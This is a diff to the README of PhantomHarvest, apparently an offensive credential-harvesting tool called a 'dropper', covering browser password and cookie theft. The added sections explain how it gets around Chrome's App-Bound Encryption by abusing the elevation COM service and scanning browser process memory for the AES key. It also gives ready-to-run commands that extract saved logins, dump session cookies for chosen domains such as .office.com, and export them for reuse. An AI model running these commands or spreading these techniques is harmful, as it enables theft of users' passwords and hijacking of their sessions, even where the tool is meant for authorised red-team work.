@@ -165,20 +165,77 @@ The default (non-`decrypt`) build keeps the binary tiny and ships zero
 crypto/sqlite dependencies — useful when you only need recon and want to keep
 the dropper small.
 
+### Chrome v20 App-Bound Encryption (Chrome 127+)
+
+Chrome 127+ protects saved passwords with a second AES-256 key whose wrapper
+can only be decrypted by the Chrome ElevationService (running as SYSTEM).
+PhantomHarvest defeats this without elevation using **two automatic fallbacks**:
+
+1. **IElevator COM** — calls `DecryptData` via Chrome's elevation service. Works
+   on Chrome < 130 or when running as SYSTEM. Chrome 130+ added binary signature
+   verification that blocks unsigned callers.
+2. **Process memory scan** — when Chrome is running, the decrypted AES-256 key
+   lives in heap memory. PhantomHarvest enumerates `chrome.exe` / `msedge.exe` /
+   `brave.exe` heap pages, extracts every 32-byte high-entropy candidate, and
+   validates each one against a known ciphertext from Login Data using AES-GCM
+   (false positive rate ≈ 2⁻¹²⁸). **Browser must be open** for this to work.
+
+```bash
+# Decrypt passwords while Chrome is running (v20 memory scan fires automatically)
+phantom-harvest.exe -decrypt-browsers -browser chrome -logins-only -high-only
+```
+
+If both methods fail (browser closed, Chrome 130+ with SYSTEM check), the tool
+reports a `v20_locked` finding and suggests alternatives:
+
+```bash
+# Supply a pre-extracted key (from memory dump / pypykatz / secretsdump)
+phantom-harvest.exe -chrome-key <32-byte-hex> -browser chrome -logins-only
+
+# Supply a DPAPI masterkey (auto-derives Chrome key from Local State blob)
+phantom-harvest.exe -dpapi-masterkey <64-byte-hex> -browser chrome -logins-only
+```
+
+### SharpChrome-Equivalent Features
+
+```bash
+# Target specific browsers
+phantom-harvest.exe -decrypt-browsers -browser chrome,edge
+
+# Filter cookies by domain
+phantom-harvest.exe -decrypt-browsers -domain .office.com -cookies-out office_cookies.txt
+
+# Passwords only, skip cookies/history/autofill/cards
+phantom-harvest.exe -decrypt-browsers -logins-only -browser chrome
+
+# Export decrypted cookies in Netscape format (curl/wget compatible)
+phantom-harvest.exe -decrypt-browsers -browser chrome -cookies-out cookies.txt
+```
+
 ## Usage
 
 ```
 Usage: phantom-harvest [options]
 
 Options:
-  -path string      Root directory to scan (default "/")
-  -depth int        Maximum directory depth (default 20)
-  -high-only        Only show HIGH confidence findings
-  -json             Output as JSON
-  -quiet            No banner output
-  -exclude string   Comma-separated paths to exclude
-  -decrypt-browsers Inline-decrypt browser passwords/cookies/cards
-                    (requires a binary built with `make build-full`)
+  -path string               Root directory to scan (default "/")
+  -depth int                 Maximum directory depth (default 20)
+  -high-only                 Only show HIGH confidence findings
+  -json                      Output as JSON
+  -quiet                     No banner output
+  -exclude string            Comma-separated paths to exclude
+  -decrypt-browsers          Inline-decrypt browser passwords/cookies/cards
+                             (requires a binary built with `make build-full`)
+  -browser string            Only scan specific browser(s): chrome,edge,firefox,brave
+  -domain string             Filter cookies by domain substring (e.g. google.com)
+  -logins-only               Extract only saved passwords, skip all else
+  -cookies-out string        Export decrypted cookies in Netscape format
+  -chrome-key string         Pre-decrypted Chrome AES key as hex (remote DPAPI)
+  -dpapi-masterkey string    DPAPI masterkey as hex — auto-decrypts Chrome Local State
+  -o string                  Output file (auto-detects .json/.csv/.txt/.html)
+  -csv string                Export to CSV
+  -txt string                Export to TXT
+  -html string               Export to HTML report
 ```
 
 ## Example Output
